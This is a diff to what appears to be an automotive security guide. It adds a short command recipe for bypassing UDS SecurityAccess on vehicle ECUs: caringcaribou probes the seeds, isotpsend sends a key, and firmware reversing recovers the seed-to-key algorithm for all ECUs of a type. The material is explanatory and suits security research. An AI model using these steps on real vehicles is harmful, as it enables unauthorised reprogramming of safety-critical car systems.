@@ -58,6 +58,19 @@ The whole scheme rests on the secrecy of the key algorithm, and that is its weak
 - **No rate limiting or weak delay.** Some ECUs allow rapid guessing; a short key space becomes brute-forceable.
 - **Replayable seeds.** If the seed is not truly random, a captured valid key can be reused.
 
+Concrete recipe:
+
+```bash
+# 1. enter programming session, then probe 0x27 and brute a short/weak key space
+caringcaribou uds security_seed 0x7E0 0x7E8 1 2 -d 1   # request seeds, observe
+# 2. if seed is constant or key algo is trivial, confirm the seed->key mapping
+#    by collecting pairs; if the ECU accepts a fixed key, send it directly:
+echo "27 02 <key-bytes>" | isotpsend -s 7E0 -d 7E8 can0
+# 3. otherwise dump the ECU firmware and reverse the 0x27 handler to get the algo
+```
+
+The durable path is step 3: recover the seed-to-key function from [firmware](../attacks/firmware-extraction.md) once, then compute keys for every ECU of that type.
+
 ## Discovery with caringcaribou
 
 To map an unknown ECU's diagnostic surface:
